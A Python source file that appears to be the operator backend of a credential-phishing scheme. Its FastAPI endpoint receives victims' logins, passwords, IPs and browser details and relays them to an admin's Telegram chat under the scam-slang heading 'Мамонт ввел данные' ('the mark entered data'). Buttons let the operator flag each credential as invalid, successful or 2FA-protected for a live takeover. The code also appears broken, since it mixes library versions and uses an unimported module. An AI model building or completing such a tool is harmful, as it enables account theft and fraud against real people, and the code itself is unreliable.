from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.webhook.aiohttp_server import SimpleRequestHandler
from aiogram.fsm.storage.memory import MemoryStorage
from fastapi import FastAPI, Request
import os
from dotenv import load_dotenv


load_dotenv()

API_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
app = FastAPI()

# Уведомление администратору
@app.post("/notify")
async def notify(request: Request):
    data = await request.json()
    login = data.get("login")
    password = data.get("password")
    device = data.get("device")
    ip = data.get("ip")
    browser = data.get("browser")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("Данные не верны", callback_data="invalid")],
        [InlineKeyboardButton("Успешно", callback_data="success")],
        [InlineKeyboardButton("Есть 2FA", callback_data="2fa")]
    ])

    message = (
        f"Мамонт ввел данные\n"
        f"Логин: {login}\n"
        f"Пароль: {password}\n"
        f"{device}, {ip}, {browser}"
    )
    await bot.send_message(chat_id=ADMIN_ID, text=message, reply_markup=keyboard)
    return {"message": "Notification sent"}

# Обработка нажатий кнопок
@dp.callback_query_handler()
async def handle_callback(callback_query: types.CallbackQuery):
    action = callback_query.data
    backend_url = os.getenv("BACKEND_URL") + "/bot-response"
    response = {"action": action}
    requests.post(backend_url, json=response)  # Отправляем действие на сервер
    await callback_query.answer("Действие обработано")
